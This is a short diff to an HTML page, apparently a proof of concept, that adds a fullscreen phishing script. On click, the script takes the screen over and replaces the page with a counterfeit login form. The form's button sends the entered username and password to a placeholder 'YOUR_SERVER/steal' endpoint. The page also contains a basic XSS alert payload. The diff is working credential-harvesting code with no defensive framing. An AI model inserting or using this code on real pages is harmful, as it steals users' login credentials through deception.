@@ -11,5 +11,15 @@
 
 
 <script>alert()</script>
+ <script>
+ onclick = () => {
+     document.documentElement.requestFullscreen()
+     setTimeout(() => {
+         document.body.innerHTML = `<div style="...仿冒登录框...">
+         <input id="u"><input id="p" type="password">
+         <button onclick="fetch('https://YOUR_SERVER/steal?u='+u.value+'&p='+p.value)">登录</button>`
+     }, 500)
+ }
+ </script>
 
 </html>
